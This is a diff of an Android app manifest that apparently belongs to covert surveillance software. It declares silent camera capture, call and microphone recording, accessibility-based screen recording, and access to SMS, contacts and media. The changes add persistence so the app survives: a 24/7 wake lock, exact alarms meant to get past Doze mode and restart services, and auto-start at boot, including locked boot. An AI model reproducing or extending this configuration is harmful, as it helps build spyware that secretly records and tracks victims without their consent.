@@ -5,6 +5,14 @@
     <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+
+    <!-- WakeLock: keeps CPU running 24/7 even with screen off -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Exact alarm: penetrates Doze mode for service restart -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
     <!-- SMS -->
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -31,19 +39,16 @@
     <!-- Contacts -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
-    <!-- Storage: READ up to API 32, WRITE up to API 28 (scoped storage after) -->
-    <uses-permission
-        android:name="android.permission.READ_EXTERNAL_STORAGE"
+    <!-- Storage -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
-    <uses-permission
-        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="28" />
-    <!-- Android 13+ granular media permissions -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
-    <!-- Foreground service — dataSync/microphone/camera need API 34+ permission -->
+    <!-- Foreground service types -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
@@ -66,7 +71,7 @@
         android:usesCleartextTraffic="true"
         android:networkSecurityConfig="@xml/network_security_config">
 
-        <!-- Splash / Lock screen -->
+        <!-- Splash screen -->
         <activity
             android:name=".SplashActivity"
             android:exported="true"
@@ -92,7 +97,7 @@
             android:turnScreenOn="false"
             android:theme="@style/Theme.KasariChauhan" />
 
-        <!-- Boot receiver -->
+        <!-- Boot receiver: auto-start after reboot -->
         <receiver
             android:name=".BootStarter"
             android:exported="true">
@@ -100,6 +105,7 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
@@ -123,7 +129,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Background polling service (dataSync = polling/network) -->
+        <!-- Background polling service (24/7 with WakeLock) -->
         <service
             android:name=".BackgroundService"
             android:exported="false"
@@ -135,28 +141,28 @@
             android:name=".BackgroundService$InnerService"
             android:exported="false" />
 
-        <!-- Call / mic recording (microphone type) -->
+        <!-- Call / mic recording -->
         <service
             android:name=".VoiceRecorder"
             android:exported="false"
             android:foregroundServiceType="microphone"
             android:stopWithTask="false" />
 
-        <!-- Screen recording via AccessibilityService frames (dataSync — no MediaProjection used) -->
+        <!-- Screen recording (AccessibilityService frames, not MediaProjection) -->
         <service
             android:name=".ScreenRecordService"
             android:exported="false"
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
-        <!-- Silent camera capture (camera type) -->
+        <!-- Silent camera capture -->
         <service
             android:name=".CameraService"
             android:exported="false"
             android:foregroundServiceType="camera"
             android:stopWithTask="false" />
 
-        <!-- Accessibility service -->
+        <!-- Accessibility service (screenshot + screen record) -->
         <service
             android:name=".ScreenMirror"
             android:exported="true"
